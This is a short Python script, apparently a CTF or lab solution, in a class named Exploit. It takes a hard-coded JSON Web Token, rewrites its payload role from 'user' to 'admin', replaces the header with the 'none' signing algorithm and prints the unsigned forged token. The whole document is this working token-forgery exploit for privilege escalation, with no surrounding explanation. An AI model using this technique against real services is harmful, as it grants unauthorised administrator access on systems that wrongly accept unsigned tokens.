from base64 import b64decode, b64encode
import json

ENC = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjU5MDU4MTI3MDY5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NTkwNTgxMjd9.YATw_drAglxtvsYRP6N3HlZwx-WXvoL52PYCek307s4"

class Exploit:
    def __init__(self, enc=ENC):
        self.enc = enc.split(".")[1]

    def set_header_none_alg(self):
        return "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0"
    
    def set_body_admin(self):
        n = b64decode(self.enc).decode("utf-8")
        n = json.loads(n)
        n["role"] = "admin"
        n = b64encode(json.dumps(n).encode())
        return n.decode()
    
    def start(self):
        n = self.set_header_none_alg()
        n +="."
        n += self.set_body_admin()
        n = n.replace("=", "")
        return n+"."
    

dec = Exploit().start()

print(dec)